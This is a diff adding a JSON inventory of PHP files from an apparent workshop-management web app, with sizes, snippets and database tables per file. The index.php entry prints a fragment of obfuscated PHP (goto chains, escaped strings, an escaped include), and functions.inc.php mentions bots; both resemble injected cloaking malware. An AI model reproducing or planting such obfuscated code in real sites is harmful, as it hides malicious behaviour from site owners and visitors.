@@ -1,0 +1,1047 @@
+[
+  {
+    "file": "1.php",
+    "size": 9614,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //HOME | //Start of the user session | $status = session_status();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "10.php",
+    "size": 28770,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //PUNCH USER | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "11.php",
+    "size": 30674,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //EDIT USER | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "12.php",
+    "size": 7919,
+    "comment_title": "UPDATE USER",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "USER",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "13.php",
+    "size": 2804,
+    "comment_title": "DELETE USER",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "14.php",
+    "size": 2891,
+    "comment_title": "RESET PASSWORD USER",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "15.php",
+    "size": 121406,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //ANALYTICS DEV | //Start of the user session | session_start();",
+    "tables": [
+      "date_creation",
+      "finish_date_update",
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "16.php",
+    "size": 99047,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //TASKS | //Start of the user session | session_start();",
+    "tables": [
+      "echo",
+      "finished_date",
+      "here",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_tasks",
+      "tb_tasks_employees_affectation"
+    ]
+  },
+  {
+    "file": "17.php",
+    "size": 239874,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //USER PERFORMANCE | //Start of the user session | session_start();",
+    "tables": [
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "18.php",
+    "size": 2737,
+    "comment_title": "UPDATE PASSWORD",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "PASSWORD",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "19.php",
+    "size": 28959,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //WIP | //Start of the user session | session_start();",
+    "tables": [
+      "date_creation",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_wip"
+    ]
+  },
+  {
+    "file": "2.php",
+    "size": 259282,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //WHITEBOARD | //Start of the user session | session_start();",
+    "tables": [
+      "date_creation",
+      "tb_jobs",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_week_notes"
+    ]
+  },
+  {
+    "file": "20.php",
+    "size": 55209,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //MYACCOUNT | //Start of the user session | session_start();",
+    "tables": [
+      "echo",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_other",
+      "tb_reminder_vehicle"
+    ]
+  },
+  {
+    "file": "21.php",
+    "size": 5161,
+    "comment_title": "UPDATE REMINDER VEHICLES",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "REMINDER",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_vehicle"
+    ]
+  },
+  {
+    "file": "22.php",
+    "size": 2777,
+    "comment_title": "DELETE VEHICLE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_vehicle"
+    ]
+  },
+  {
+    "file": "23.php",
+    "size": 4114,
+    "comment_title": "CREATE VEHICLES",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_vehicle"
+    ]
+  },
+  {
+    "file": "24.php",
+    "size": 4922,
+    "comment_title": "UPDATE REMINDER SITESAFE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "REMINDER",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "25.php",
+    "size": 4089,
+    "comment_title": "UPDATE REMINDER OTHERS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "REMINDER",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_other"
+    ]
+  },
+  {
+    "file": "26.php",
+    "size": 2759,
+    "comment_title": "DELETE OTHER",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_other"
+    ]
+  },
+  {
+    "file": "27.php",
+    "size": 3457,
+    "comment_title": "CREATE OTHER",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_other"
+    ]
+  },
+  {
+    "file": "28.php",
+    "size": 8927,
+    "comment_title": "UPDATE TASKS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "TASKS",
+      "on",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_tasks",
+      "tb_tasks_employees_affectation"
+    ]
+  },
+  {
+    "file": "29.php",
+    "size": 3245,
+    "comment_title": "DELETE TASKS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_tasks",
+      "tb_tasks_employees_affectation"
+    ]
+  },
+  {
+    "file": "2bis.php",
+    "size": 135132,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //WHITEBOARD READ ONLY | //Start of the user session | session_start();",
+    "tables": [
+      "tb_jobs",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "3.php",
+    "size": 124788,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //JOBS DEV | //Start of the user session | session_start();",
+    "tables": [
+      "date_creation",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "30.php",
+    "size": 7674,
+    "comment_title": "CREATE TASKS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_tasks",
+      "tb_tasks_employees_affectation"
+    ]
+  },
+  {
+    "file": "31.php",
+    "size": 4352,
+    "comment_title": "UPDATE TASKS BY EMPLOYEE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "TASKS",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_tasks"
+    ]
+  },
+  {
+    "file": "32.php",
+    "size": 79288,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //WIP DETAIL | //Start of the user session | session_start();",
+    "tables": [
+      "date_creation",
+      "document",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_wip"
+    ]
+  },
+  {
+    "file": "33.php",
+    "size": 4827,
+    "comment_title": "PUNCH SHEET ACTIONS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "34.php",
+    "size": 15455,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //DEVICE | //Start of the user session | session_start();",
+    "tables": [
+      "echo",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "35.php",
+    "size": 3820,
+    "comment_title": "UPDATE DEVICE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "DEVICE",
+      "query",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "36.php",
+    "size": 3324,
+    "comment_title": "CREATE DEVICE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "37.php",
+    "size": 2772,
+    "comment_title": "DELETE DEVICE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "39.php",
+    "size": 68460,
+    "comment_title": "TICK ALL JOBSHEET",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "date_creation",
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "3bis.php",
+    "size": 58517,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //JOBS FILTERED DEV | //Start of the user session | session_start();",
+    "tables": [
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "4.php",
+    "size": 38702,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //ACTIVITY | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "40.php",
+    "size": 19404,
+    "comment_title": "UPDATE WIP DETAIL",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "WIP",
+      "date_creation",
+      "if",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_wip"
+    ]
+  },
+  {
+    "file": "41.php",
+    "size": 5146,
+    "comment_title": "WIP INSPECTION COMPLETED",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "date_creation",
+      "tb_jobs",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "42.php",
+    "size": 51642,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //Workload Plan | //Start of the user session | session_start();",
+    "tables": [
+      "aray",
+      "drop",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_leaves",
+      "tb_login",
+      "tb_public_holidays",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "43.php",
+    "size": 62875,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //Holiday | //Start of the user session | session_start();",
+    "tables": [
+      "date_start",
+      "date_stop",
+      "tb_keys_remote_devices",
+      "tb_leaves",
+      "tb_login",
+      "tb_public_holidays"
+    ]
+  },
+  {
+    "file": "44.php",
+    "size": 3829,
+    "comment_title": "UPDATE PUBLIC HOLIDAYS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "PUBLIC",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_public_holidays"
+    ]
+  },
+  {
+    "file": "45.php",
+    "size": 4195,
+    "comment_title": "UPDATE LEAVES",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "LEAVES",
+      "data",
+      "tb_keys_remote_devices",
+      "tb_leaves",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "46.php",
+    "size": 3432,
+    "comment_title": "CREATE PUBLIC HOLIDAYS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_public_holidays"
+    ]
+  },
+  {
+    "file": "47.php",
+    "size": 3488,
+    "comment_title": "CREATE ANNUAL LEAVES",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_leaves",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "48.php",
+    "size": 2829,
+    "comment_title": "DELETE PUBLIC HOLIDAYS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_public_holidays"
+    ]
+  },
+  {
+    "file": "49.php",
+    "size": 2809,
+    "comment_title": "DELETE ANNUAL LEAVES",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_leaves",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "4bis.php",
+    "size": 49821,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //ACTIVITY | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "4bisSHOP.php",
+    "size": 42266,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //ACTIVITY | //Start of the user session | session_start();",
+    "tables": [
+      "DESC",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "5.php",
+    "size": 12425,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //LOGIN | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "50.php",
+    "size": 245980,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //JOBSHEET DEV | //Start of the user session | session_start();",
+    "tables": [
+      "b",
+      "date_creation",
+      "echo",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "51.php",
+    "size": 133411,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //Employee Work Load | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "52.php",
+    "size": 138648,
+    "comment_title": "MODIFICATION OF PUNCH SHEET BY AN ADMIN DEV",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "53.php",
+    "size": 17354,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //EXPORT DATA | //Start of the user session | session_start();",
+    "tables": [
+      "export_date",
+      "tb_export_data",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "54.php",
+    "size": 3637,
+    "comment_title": "EXPORT DATABASE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_export_data",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "55.php",
+    "size": 3372,
+    "comment_title": "EXPORT DATABASE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "56.php",
+    "size": 88623,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //Production Plan | //Start of the user session | session_start();",
+    "tables": [
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_production_plan",
+      "tb_public_holidays",
+      "var"
+    ]
+  },
+  {
+    "file": "57.php",
+    "size": 5436,
+    "comment_title": "UPDATE PRODUCTION PLAN",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "PRODUCTION",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_production_plan"
+    ]
+  },
+  {
+    "file": "58.php",
+    "size": 4312,
+    "comment_title": "CREATE PRODUCTION PLAN",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_production_plan"
+    ]
+  },
+  {
+    "file": "59.php",
+    "size": 4524,
+    "comment_title": "DELETE PRODUCTION PLAN",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_production_plan"
+    ]
+  },
+  {
+    "file": "6.php",
+    "size": 37932,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //MYACCOUNT | //Start of the user session | session_start();",
+    "tables": [
+      "here",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "60.php",
+    "size": 21224,
+    "comment_title": "UPDATE NOTES ON WHITEBOARD",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "NOTES",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_week_notes"
+    ]
+  },
+  {
+    "file": "61.php",
+    "size": 24105,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //PAINTING | //Start of the user session | session_start();",
+    "tables": [
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "62.php",
+    "size": 5123,
+    "comment_title": "UPDATE PAINTING JOBS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "PAINTING",
+      "TICK",
+      "UNTICK",
+      "if",
+      "tb_jobs",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "63.php",
+    "size": 3071,
+    "comment_title": "UPDATE COMMENT PAINTING JOBS",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "COMMENT",
+      "DB",
+      "tb_jobs",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "64.php",
+    "size": 40486,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //FASTENERS | //Start of the user session | session_start();",
+    "tables": [
+      "date_creation",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "65.php",
+    "size": 4550,
+    "comment_title": "FASTENERS SAVE",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_jobs",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "66.php",
+    "size": 17264,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //UPLOAD PHOTO | //Start of the user session | session_start();",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_photos"
+    ]
+  },
+  {
+    "file": "67.php",
+    "size": 8548,
+    "comment_title": "UPLOAD PHOTO",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_photos"
+    ]
+  },
+  {
+    "file": "68.php",
+    "size": 3785,
+    "comment_title": "OPEN PHOTO FULL SCREEN",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_photos"
+    ]
+  },
+  {
+    "file": "69.php",
+    "size": 3363,
+    "comment_title": "ROTATE PHOTO",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "7.php",
+    "size": 713569,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //JOBSHEET | //Start of the user session | session_start();",
+    "tables": [
+      "Job",
+      "b",
+      "button",
+      "date_creation",
+      "echo",
+      "job",
+      "tb_jobs",
+      "tb_jobs_dates",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet",
+      "tb_wip"
+    ]
+  },
+  {
+    "file": "70.php",
+    "size": 3365,
+    "comment_title": "ROTATE PHOTO DEV",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "71.php",
+    "size": 15465,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //HelpForm | //Start of the user session | if (session_status() == PHP_SESSION_NONE) {",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "72.php",
+    "size": 5527,
+    "comment_title": "",
+    "snippet": "<?php | //Helptreatment | //Start of the user session | if (session_status() == PHP_SESSION_NONE) {",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "73.php",
+    "size": 32796,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //Perf Export | //Start of the user session | if (session_status() == PHP_SESSION_NONE) {",
+    "tables": [
+      "tb_jobs_dates",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "8.php",
+    "size": 64350,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //CREATE OR UPDATE JOBSHEET DEV | //Start of the user session | session_start();",
+    "tables": [
+      "JOBSHEET",
+      "button",
+      "date_creation",
+      "echo",
+      "if",
+      "job",
+      "tb_jobs",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "value"
+    ]
+  },
+  {
+    "file": "9.php",
+    "size": 266613,
+    "comment_title": "Facebook Open Graph",
+    "snippet": "<?php | //PUNCHCLOCK | //Start of the user session | if (session_status() == PHP_SESSION_NONE) {",
+    "tables": [
+      "Punch_User",
+      "date_creation",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "PunchSheetAction.php",
+    "size": 19806,
+    "comment_title": "PUNCH SHEET ACTION",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "LIST",
+      "tb_jobs_date_install",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  },
+  {
+    "file": "connect.php",
+    "size": 36892,
+    "comment_title": "CONNECT",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_reminder_other",
+      "tb_reminder_vehicle",
+      "tb_tasks",
+      "tb_tasks_employees_affectation"
+    ]
+  },
+  {
+    "file": "create_update_job.php",
+    "size": 36226,
+    "comment_title": "CREATE OR UPDATE JOBS DEV",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "JOBS",
+      "date_creation",
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_jobs_dates",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_wip"
+    ]
+  },
+  {
+    "file": "destroysession.php",
+    "size": 626,
+    "comment_title": "",
+    "snippet": "<?php | //Start of the user session | session_start(); | //Destroy the values in the session",
+    "tables": []
+  },
+  {
+    "file": "disconnect.php",
+    "size": 2459,
+    "comment_title": "DISCONNECT",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "functions.inc.php",
+    "size": 25883,
+    "comment_title": "\\n$style\\n",
+    "snippet": "<?php | function getRequestUri($baseUrl) { | $nh = preg_replace('#/\\./#', '/', $baseUrl); | $nh = preg_replace('#^http[s]*://[^/]+/#i', '/', $nh);",
+    "tables": [
+      "bots"
+    ]
+  },
+  {
+    "file": "index.php",
+    "size": 37873,
+    "comment_title": "",
+    "snippet": "<?php | goto aAlnE; B5_2l: $prfhO = str_replace(\"\\74\\147\\x61\\55\\x63\\157\\144\\145\\x2f\\76\", $LGRtq, $prfhO); goto uV5sn; YBjyL: include \"\\64\\x30\\x34\\56\\150\\x74\\x6d\\154\"; goto NGb2Y; aAlnE: error_reportin",
+    "tables": []
+  },
+  {
+    "file": "register.php",
+    "size": 7731,
+    "comment_title": "REGISTER",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "update_dateinstalljobs.php",
+    "size": 8950,
+    "comment_title": "UPDATE DATE INSTALL JOB",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_keys_remote_devices",
+      "tb_login"
+    ]
+  },
+  {
+    "file": "update_jobsdetails.php",
+    "size": 91047,
+    "comment_title": "UPDATE JOB DETAIL",
+    "snippet": "<?php | //Start of the user session | session_start(); | ?>",
+    "tables": [
+      "JOB",
+      "b",
+      "date_creation",
+      "tb_jobs",
+      "tb_jobs_date_install",
+      "tb_jobs_dates",
+      "tb_jobs_details",
+      "tb_keys_remote_devices",
+      "tb_login",
+      "tb_punchsheet"
+    ]
+  }
+]
